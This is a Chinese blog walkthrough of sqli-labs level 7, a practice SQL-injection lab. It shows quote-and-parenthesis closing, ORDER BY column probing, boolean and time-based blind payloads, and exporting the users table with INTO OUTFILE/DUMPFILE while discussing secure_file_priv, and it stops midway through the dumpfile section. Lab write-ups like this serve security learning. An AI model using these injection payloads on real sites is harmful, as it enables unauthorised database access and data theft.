<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>sqli-labs 第七关 多命通关攻略 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="sqli-labs 第七关 多命通关攻略" />
<meta property="og:description" content="sqli-labs 第七关 多命通关攻略 描述字符串与数值之间的转换判断注入类型返回结果正常输入不正常输入错误输入 总结判断注入类型判断是否为字符型注入判断是否为单引号字符型注入判断是否为双引号字符型注入 判断是否为数值型注入 总结判断注入类型（修正版）字符型注入判断是否为单引号字符型注入判断是否为双引号字符型注入 真的只需要正确闭合引号即可吗 判断 SQL 查询结果中的列数猜测 SQL 查询结果中的列数为两列猜测 SQL 查询结果中的列数为三列猜测 SQL 查询结果中的列数为四列 爆破爆破方式的可行性1. 报错注入2. 布尔盲注3. 时间盲注4. 数据导出注： 数据导出secure_file_priv查看参数 secure_file_priv 对应的值因 secure_file_priv 的取值不同所造成的不同影响 into outfile使用 into outfile 来导出文件 into dumpfileinto dumpfile 与 into outfile 的区别 load_file()注修改 secure_file_priv配置文件 my.ini权限问题修改文件夹权限问题总结求索（追求和探索）复制权限设置验证可行性组或用户名 Users结论 尝试进行数据导出 描述 项目描述操作系统Windows 10 专业版MySQL 版本MySQL 5.7.40Apache 版本Apache 2.2.39 字符串与数值之间的转换 MySQL 在遇到需要数值时你却提供给它字符串的情景下，会自动将字符串转换为数值。
转换方式如下：
‘a’ 转换为 0
‘1a’ 转换为 1
‘2b3’ 转换为 2
判断注入类型 返回结果 正常输入 ?id=1 返回结果为：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/ae8c97dce239dbb53f998773997579d1/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-08T07:15:26+08:00" />
<meta property="article:modified_time" content="2023-01-08T07:15:26+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">sqli-labs 第七关 多命通关攻略</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>sqli-labs 第七关 多命通关攻略</h4> 
 <ul><li><a href="#_2" rel="nofollow">描述</a></li><li><a href="#_9" rel="nofollow">字符串与数值之间的转换</a></li><li><a href="#_18" rel="nofollow">判断注入类型</a></li><li><ul><li><ul><li><a href="#_19" rel="nofollow">返回结果</a></li><li><ul><li><ul><li><a href="#_20" rel="nofollow">正常输入</a></li><li><a href="#_40" rel="nofollow">不正常输入</a></li><li><a href="#_55" rel="nofollow">错误输入</a></li></ul> 
    </li></ul> 
    </li><li><a href="#_66" rel="nofollow">总结</a></li><li><a href="#_76" rel="nofollow">判断注入类型</a></li><li><ul><li><ul><li><a href="#_77" rel="nofollow">判断是否为字符型注入</a></li><li><ul><li><a href="#_78" rel="nofollow">判断是否为单引号字符型注入</a></li><li><a href="#_87" rel="nofollow">判断是否为双引号字符型注入</a></li></ul> 
      </li><li><a href="#_96" rel="nofollow">判断是否为数值型注入</a></li></ul> 
    </li></ul> 
    </li><li><a href="#_105" rel="nofollow">总结</a></li><li><a href="#_113" rel="nofollow">判断注入类型（修正版）</a></li><li><ul><li><ul><li><a href="#_114" rel="nofollow">字符型注入</a></li><li><ul><li><a href="#_115" rel="nofollow">判断是否为单引号字符型注入</a></li><li><a href="#_124" rel="nofollow">判断是否为双引号字符型注入</a></li></ul> 
     </li></ul> 
    </li></ul> 
    </li><li><a href="#_141" rel="nofollow">真的只需要正确闭合引号即可吗</a></li></ul> 
  </li></ul> 
  </li><li><a href="#_SQL__185" rel="nofollow">判断 SQL 查询结果中的列数</a></li><li><ul><li><ul><li><a href="#_SQL__186" rel="nofollow">猜测 SQL 查询结果中的列数为两列</a></li><li><a href="#_SQL__195" rel="nofollow">猜测 SQL 查询结果中的列数为三列</a></li><li><a href="#_SQL__204" rel="nofollow">猜测 SQL 查询结果中的列数为四列</a></li></ul> 
  </li></ul> 
  </li><li><a href="#_215" rel="nofollow">爆破</a></li><li><ul><li><ul><li><a href="#_216" rel="nofollow">爆破方式的可行性</a></li><li><ul><li><ul><li><a href="#1__217" rel="nofollow">1. 报错注入</a></li><li><a href="#2__220" rel="nofollow">2. 布尔盲注</a></li><li><a href="#3__251" rel="nofollow">3. 时间盲注</a></li><li><a href="#4__263" rel="nofollow">4. 数据导出</a></li><li><a href="#_268" rel="nofollow">注：</a></li></ul> 
    </li></ul> 
   </li></ul> 
  </li></ul> 
  </li><li><a href="#_272" rel="nofollow">数据导出</a></li><li><ul><li><ul><li><a href="#secure_file_priv_275" rel="nofollow">secure_file_priv</a></li><li><ul><li><ul><li><a href="#_secure_file_priv__277" rel="nofollow">查看参数 secure_file_priv 对应的值</a></li><li><a href="#_secure_file_priv__300" rel="nofollow">因 secure_file_priv 的取值不同所造成的不同影响</a></li></ul> 
    </li></ul> 
    </li><li><a href="#into_outfile_306" rel="nofollow">into outfile</a></li><li><ul><li><ul><li><a href="#_into_outfile__334" rel="nofollow">使用 into outfile 来导出文件</a></li></ul> 
    </li></ul> 
    </li><li><a href="#into_dumpfile_372" rel="nofollow">into dumpfile</a></li><li><ul><li><ul><li><a href="#into_dumpfile__into_outfile__407" rel="nofollow">into dumpfile 与 into outfile 的区别</a></li></ul> 
    </li></ul> 
    </li><li><a href="#load_file_434" rel="nofollow">load_file()</a></li><li><a href="#_444" rel="nofollow">注</a></li><li><a href="#_secure_file_priv_449" rel="nofollow">修改 secure_file_priv</a></li><li><ul><li><ul><li><a href="#_myini_452" rel="nofollow">配置文件 my.ini</a></li><li><a href="#_466" rel="nofollow">权限问题</a></li><li><a href="#_477" rel="nofollow">修改文件夹权限</a></li><li><ul><li><a href="#_478" rel="nofollow">问题总结</a></li><li><a href="#_492" rel="nofollow">求索（追求和探索）</a></li><li><a href="#_520" rel="nofollow">复制权限设置</a></li><li><a href="#_553" rel="nofollow">验证可行性</a></li><li><a href="#_Users_564" rel="nofollow">组或用户名 Users</a></li><li><a href="#_571" rel="nofollow">结论</a></li></ul> 
     </li></ul> 
    </li></ul> 
    </li><li><a href="#_576" rel="nofollow">尝试进行数据导出</a></li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="_2"></a>描述</h2> 
<table><thead><tr><th>项目</th><th>描述</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 10 专业版</td></tr><tr><td>MySQL 版本</td><td>MySQL 5.7.40</td></tr><tr><td>Apache 版本</td><td>Apache 2.2.39</td></tr></tbody></table> 
<h2><a id="_9"></a>字符串与数值之间的转换</h2> 
<p>MySQL 在遇到需要数值时你却提供给它字符串的情景下，会自动将字符串转换为数值。<br> 转换方式如下：</p> 
<blockquote> 
 <p>‘a’ 转换为 0<br> ‘1a’ 转换为 1<br> ‘2b3’ 转换为 2</p> 
</blockquote> 
<h2><a id="_18"></a>判断注入类型</h2> 
<h4><a id="_19"></a>返回结果</h4> 
<h6><a id="_20"></a>正常输入</h6> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token number">1</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You are in… Use outfile…</p> 
</blockquote> 
<p><em><strong>再次进行尝试：</strong></em></p> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token number">10</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You are in… Use outfile…</p> 
</blockquote> 
<p>在两次进行正常输入后，返回结果仍为变化。</p> 
<h6><a id="_40"></a>不正常输入</h6> 
<p>我们知道，在 sqli-labs 靶场中，参数 id 的合理值为 <strong>1~15</strong>。<br> 所以我们来尝试将参数 id 的值设置为 15：</p> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">15</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<p>该返回结果告知我们 SQL 存在语法错误。<br> 可是这种查询并没有破坏查询语句的结构，何来 SQL 语法错误，SQL 查询语句查询不到对应的值，应该返回的是一个空集。<br> <img src="https://images2.imgbox.com/24/39/rZDFDSNT_o.png" alt="返回空集"></p> 
<h6><a id="_55"></a>错误输入</h6> 
<p>使用如下语句，无论是字符型注入还是数字型错误都将引发 SQL 错误（无论是哪一种情况，该语句都能破坏 SQL 查询语句的正常结构）。</p> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<h4><a id="_66"></a>总结</h4> 
<p><strong>由上述三种输入方式的测试结果，我们观察到如下现象：</strong></p> 
<ol><li>错误输入与不正常输入的返回结果是相同的。</li></ol> 
<p><strong>于是，我们做出推测：</strong><br> 该页面的 PHP 代码存在这么一个判断语句，在 SQL 查询结果不为空集时，返回结果为 <strong>You are in… Use outfile…</strong> ；反之返回 <strong>You have an error in your SQL syntax</strong>。</p> 
<h4><a id="_76"></a>判断注入类型</h4> 
<h6><a id="_77"></a>判断是否为字符型注入</h6> 
<h6><a id="_78"></a>判断是否为单引号字符型注入</h6> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span>'<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<h6><a id="_87"></a>判断是否为双引号字符型注入</h6> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span>"<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<h6><a id="_96"></a>判断是否为数值型注入</h6> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<h4><a id="_105"></a>总结</h4> 
<p>怎么会这样？<br> 等等，我们刚刚得出的结论好像被忽略了：</p> 
<blockquote> 
 <p>该页面的 PHP 代码存在这么一个判断语句，在 SQL 查询结果不为空集时，返回结果为 <strong>You are in… Use outfile…</strong> ；反之返回 <strong>You have an error in your SQL syntax</strong>。</p> 
</blockquote> 
<p>既然返回结果为空都将返回 <strong>You have an error in your SQL syntax</strong>，那我们刚刚构造的判断语句又怎么能够判断出注入类型呢？</p> 
<h4><a id="_113"></a>判断注入类型（修正版）</h4> 
<h6><a id="_114"></a>字符型注入</h6> 
<h6><a id="_115"></a>判断是否为单引号字符型注入</h6> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>'<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<h6><a id="_124"></a>判断是否为双引号字符型注入</h6> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>"<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果：</p> 
<blockquote> 
 <p>You are in… Use outfile…</p> 
</blockquote> 
<p>由于字符型注入的返回结果发生了变化，我们可以推断注入类型不为数值型注入（在该类场景下判断是否为数字型注入需要通过字符型注入结果进行反推），而应为单引号字符型注入（由结果可以发现，双引号注入属于正常输入，而单引号注入属于错误输入）。</p> 
<p><strong>注：</strong></p> 
<ol><li><strong>’1"’</strong> 会被 MySQL 转化为数值 <strong>1</strong>。</li><li>在 <strong>?id=1"--+</strong> 中不是存在注释符号吗，怎么 SQL 查询还能正常返回查询结果呢？这是因为外层为单引号，所以注释符号被当成了字符串，并没有发挥其功能。</li></ol> 
<h4><a id="_141"></a>真的只需要正确闭合引号即可吗</h4> 
<p>在不清楚这个问题的答案前，如果你继续执行后续的步骤，你会发现这似乎是一个无解的题目。<br> 让我们来做两个实验：</p> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<p>由于 1 永远不可能等于 2，所以该逻辑表达式将返回 false。接下来，我们观察另一组实验：</p> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>由于 1 永远等于 1，逻辑与运算符两边的结果均为 true，所以该表达式将返回 true。因此返回结果应该为 <strong>You are in… Use outfile…</strong>，但返回结果却为</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<p>这说明我们并没有正确闭合特殊符号，除了闭合引号外，SQL 注入中，我们往往还需要关注另一类符号，比如括号。于是我们构造如下语句：</p> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果仍旧为：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<p>也许外层还存在一个括号需要闭合，我们再尝试去闭合括号：</p> 
<pre><code class="prism language-python">?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You are in… Use outfile…</p> 
</blockquote> 
<p>至此，我们已正确闭合在 SQL 注入中需要闭合的符号。</p> 
<h2><a id="_SQL__185"></a>判断 SQL 查询结果中的列数</h2> 
<h4><a id="_SQL__186"></a>猜测 SQL 查询结果中的列数为两列</h4> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment">--+</span>
</code></pre> 
<p>返回结果：</p> 
<blockquote> 
 <p>You are in… Use outfile…</p> 
</blockquote> 
<h4><a id="_SQL__195"></a>猜测 SQL 查询结果中的列数为三列</h4> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">--+</span>
</code></pre> 
<p>返回结果：</p> 
<blockquote> 
 <p>You are in… Use outfile…</p> 
</blockquote> 
<h4><a id="_SQL__204"></a>猜测 SQL 查询结果中的列数为四列</h4> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment">--+</span>
</code></pre> 
<p>返回结果为：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<p>这说明 SQL 查询返回结果的列数为三列。</p> 
<h2><a id="_215"></a>爆破</h2> 
<h4><a id="_216"></a>爆破方式的可行性</h4> 
<h6><a id="1__217"></a>1. 报错注入</h6> 
<p>由于在这一关中，错误输入不会显示错误，所以我们无法通过报错注入来爆破相关数据。</p> 
<h6><a id="2__220"></a>2. 布尔盲注</h6> 
<p>布尔盲注需要通过 PHP 页面中显示的是 <strong>You are in… Use outfile…</strong> 还是 <strong>You have an error in your SQL syntax</strong> 来判断猜测是否正确。我们知道在 sqli-labs 中默认使用的数据库为 <strong>security</strong>，即 <strong>database()</strong> 函数的返回值为 <strong>security</strong> 。<br> 于是，我们可以尝试构造如下表达式判断 database() 函数的返回值是否为 s：</p> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">')) and '</span>s' <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+ 	</span>
</code></pre> 
<p>返回结果：</p> 
<blockquote> 
 <p>You are in… Use outfile…</p> 
</blockquote> 
<p>来试着判断 database() 函数的返回值中的第一个字符是否为 ‘a’。</p> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">')) and '</span>a' <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre> 
<p>返回结果：</p> 
<blockquote> 
 <p>You have an error in your SQL syntax</p> 
</blockquote> 
<p>布尔注入的思路大概就是这样，可以通过编写一个程序通过该种方式来获取数据库名、表名及列名等信息。</p> 
<p><strong>注：</strong><br> 在该关下使用布尔注入时，不要采用联合注入的方式，否则即使构造语句如下返回的也是 <strong>You are in… Use outfile…</strong>，因为该关卡是通过判断 SQL 查询是否返回了内容来展示不同的内容的，即使返回的是一个空表。</p> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token string">')) union select if(substr(database(), 1, 1)='</span>a<span class="token string">', 1, '</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token comment">--+</span>
</code></pre> 
<h6><a id="3__251"></a>3. 时间盲注</h6> 
<p>时间盲注是通过页面回显的时间（可以通过 sleep() 函数来控制页面的回显时间）来判断的。要使用时间盲注我们可以构造如下语句：</p> 
<pre><code class="prism language-sql">?id<span class="token operator">=</span><span class="token string">')) union select if(substr(database(), 1, 1)='</span>a<span class="token string">', sleep(10), '</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token comment">--+</span>
</code></pre> 
<p>上述时间盲注语句将在判断结果为 true 时等待 10 秒（为了不耗费太多时间可以将 sleep 函数的参数适当减小），在判断结果为 false 时返回一个空字符串。<br> 至于如何去判断是否回显，可以通过观察浏览器中的进度条来进行判断。</p> 
<p><img src="https://images2.imgbox.com/ab/91/Diu9Z1LZ_o.png" alt="可以通过观察浏览器加载的进度来判断是否回显成功"></p> 
<h6><a id="4__263"></a>4. 数据导出</h6> 
<p>在 SQL 注入过程中，我们可以通过关键字 into dumpfile、into outfile 等关键字来向网站导出数据到指定文件中，然后通过构造 URL 来对该文本文件进行访问。</p> 
<p>使用上述函数来实现导入导出功能仅能在参数 secure_file_priv 指定的文件夹下中成功操作。</p> 
<h6><a id="_268"></a>注：</h6> 
<p>布尔盲注及时间盲注将在后续关卡（第八关及第九关）中进行详细讲解。</p> 
<h2><a id="_272"></a>数据导出</h2> 
<p>由于 数据导出 这种方式比较特殊，本关卡主要使用 数据导出 的方式来对数据库进行爆破。</p> 
<h4><a id="secure_file_priv_275"></a>secure_file_priv</h4> 
<h6><a id="_secure_file_priv__277"></a>查看参数 secure_file_priv 对应的值</h6> 
<p>在 MySQL 中，我们可以通过输入如下命令来查找 secure_file_priv 参数对应的值为多少：</p> 
<pre><code class="prism language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'secure%'</span><span class="token punctuation">;</span>

<span class="token comment"># 或</span>

<span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'secure%'</span><span class="token punctuation">;</span>

<span class="token comment"># 或</span>

<span class="token keyword">select</span> @<span class="token variable">@secure_file_priv</span><span class="token punctuation">;</span>
</code></pre> 
<p>使用该命令后，我们得到的结果如下：</p> 
<p><img src="https://images2.imgbox.com/d2/2b/oSk0RzBa_o.png" alt="secure_file_priv 的值"><br> <img src="https://images2.imgbox.com/a1/59/Q6jCGFbV_o.png" alt="获取 secure_file_priv 的第三种方式"></p> 
<p>由于我使用的 MySQL 版本为 <strong>5.7.40</strong> 因此该参数的值为 <strong>C:\ProgramData\MySQL\MySQL Server 5.7\Uploads\</strong>，你通过该命令获取到的参数值或许与我的结果并不相同。</p> 
<h6><a id="_secure_file_priv__300"></a>因 secure_file_priv 的取值不同所造成的不同影响</h6> 
<ol><li>secure_file_priv 参数对应的值为 <strong>空</strong> 或 <strong>‘\’</strong> 时，可使用关键字 <strong>into dumpfile</strong>、<strong>into outfile</strong> 在任意路径下实现导出功能;可使用函数 <strong>load_file()</strong> 在任意路径下实现读取文件内容的功能。</li><li>在该参数对应的值为 <strong>null</strong> 时，将禁止在任何路径下实现读取及导出功能。</li><li>在该参数对应的值为 <strong>某一路径时</strong> 仅允许在该路径下实现读取及导出功能。</li></ol> 
<h4><a id="into_outfile_306"></a>into outfile</h4> 
<hr> 
<p>在 MySQL 中，可以使用 SELECTI…INTO OUTFILE 语句将表的内容导出成一个文本文件。SELECT…INTO OUTFILE 语句基本格式如下:</p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> 列名 <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token punctuation">[</span><span class="token keyword">WHERE</span> 语句<span class="token punctuation">]</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'目标文件'</span><span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span>
</code></pre> 
<p>该语句用 SELECT 来查询所需要的数据，用 INTO OUTFILE 来导出数据。其中，目标文件用来指定将查询的结果导出到哪个文件。这里需要注意的是，<strong>目标文件不能是一个已经存在的文件</strong>。</p> 
<p><em><strong>[OPTIONS] 为可选参数选项，OPTIONS 部分的语法包括 FIELDS 和 LINES 子句，其常用的取值有：</strong></em></p> 
<ol><li>FIELDS TERMINATED BY ‘字符串’：<br> 设置字符串为字段之间的分隔符，可以为单个或多个字符，默认情况下为制表符‘\t’。</li><li>FIELDS [OPTIONALLY] ENCLOSED BY ‘字符’：<br> 设置字符来括上 CHAR、VARCHAR 和 TEXT 等字符型字段。如果使用了 OPTIONALLY 则只能用来括上 CHAR 和 VARCHAR 等字符型字段。</li><li>FIELDS ESCAPED BY ‘字符’：<br> 设置如何写入或读取特殊字符，只能为单个字符，即设置转义字符，默认值为‘\’。</li><li>LINES STARTING BY ‘字符串’：<br> 设置每行开头的字符，可以为单个或多个字符，默认情况下不使用任何字符。</li><li>LINES TERMINATED BY ‘字符串’：<br> 设置每行结尾的字符，可以为单个或多个字符，默认值为‘\n’ 。</li></ol> 
<p><strong>注：</strong><br> FIELDS 和 LINES 两个子句都是自选的，但是如果两个都被指定了，FIELDS 必须位于 LINES的前面。</p> 
<p><em><strong>上述内容整理自 网络</strong></em></p> 
<hr> 
<h6><a id="_into_outfile__334"></a>使用 into outfile 来导出文件</h6> 
<p><img src="https://images2.imgbox.com/8c/25/GfCpHeyr_o.png" alt="security 数据库中表的具体情况"></p> 
<p>这里我们选择导出 <strong>users</strong> 这张表中的内容，首先让我们看看 <strong>users</strong> 表中的具体内容。</p> 
<p><img src="https://images2.imgbox.com/08/2d/vbIT7jiS_o.png" alt="users 表中的具体内容"></p> 
<p>使用如下命令将 users 表中的内容导出到路径 <strong>C:\ProgramData\MySQL\MySQL Server 5.7\Uploads\</strong> 中：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">into</span> <span class="token keyword">outfile</span> 'C:\ProgramData\MySQL\MySQL Server <span class="token number">5.7</span>\Uploads\'<span class="token punctuation">;</span>
</code></pre> 
<p>不幸的是，该语句造成了错误。<br> <img src="https://images2.imgbox.com/0e/30/RI4Yxfvc_o.png" alt="错误信息"></p> 
<p>在 MySQL 中输入路径需要多加一个 <strong>\</strong> 用来将 <strong>\</strong> 转义。<br> 所以我们更改语句为：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\'</span><span class="token punctuation">;</span>
</code></pre> 
<p>记住，指定的路径不能为已存在的文件（夹），否则你将看到如下信息。</p> 
<p><img src="https://images2.imgbox.com/79/7b/WYhhXkrr_o.png" alt="错误信息"></p> 
<p>让我们再次进行修改：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\return.txt'</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/15/19/kDzDPYRa_o.png" alt="导出成功"></p> 
<p><img src="https://images2.imgbox.com/16/63/ofwcPoW3_o.png" alt="成功导出"></p> 
<p>可以看到 users 表已成功导出（奇怪的是 id 为 13 的哪一行记录不见了，还是说一直都不存在）。<br> 我们可以通过将查询结果导出到指定路径，但是，导出的路径 <strong>C:\ProgramData\MySQL\MySQL Server 5.7\Uploads\</strong> 的位置似乎离网站根目录较远，我们不可能通过使用 <strong>…/</strong> 来返回上一级来访问导出文件，这就要求我们稍后需要修改 secure_file_priv 参数对应的值来制造该方法爆破数据库的可能性（将数据导出到网站根目录下的指定文件中）。</p> 
<h4><a id="into_dumpfile_372"></a>into dumpfile</h4> 
<p>让我们尝试使用关键字 <strong>into dumpfile</strong> 来导出表中内容，我们同样选择的是 <strong>users</strong> 表中的内容。</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\return_1.txt'</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/1b/d9/Gcn7nh8h_o.png" alt="仅支持导出一行记录"><br> 在执行该语句后，MySQL 返回了报错信息，表明仅支持导入一行记录。<br> 于是我们修改 SQL 语句：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\return_1.txt'</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/73/42/ROudZQzx_o.png" alt="文件已存在"><br> 由报错信息可以猜测，在尝试使用 <strong>into dumpfile</strong> 导出多行记录时，虽然 MySQL 会产生报错信息，但仍将第一行记录导出到指定文件夹中了。</p> 
<p>我们可以打开 <strong>return_1.txt</strong> 文件来验证这个猜想。</p> 
<p><img src="https://images2.imgbox.com/b6/07/bErSmxFp_o.png" alt="return_1.txt 文件"></p> 
<p>好吧，假设出错。<br> <em><strong>正确结论应该为：</strong></em><br> 在尝试使用关键字 <strong>into dumpfile</strong> 导出多行记录时，虽为产生报错信息，但会成功将前两行记录导出到指定文件中。</p> 
<p>构造 SQL 语句如下：</p> 
<pre><code class="prism language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\return_2.txt'</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/43/91/3ImwtTZE_o.png" alt="使用关键字 into dumpfile 尝试导出一行记录"><br> 在使用关键字 <strong>into dumpfile</strong> 尝试将一行记录导出到指定文件中时，MySQL 并不会提示报错信息，让我们观察观察文件 <strong>return_2.txt</strong> ：</p> 
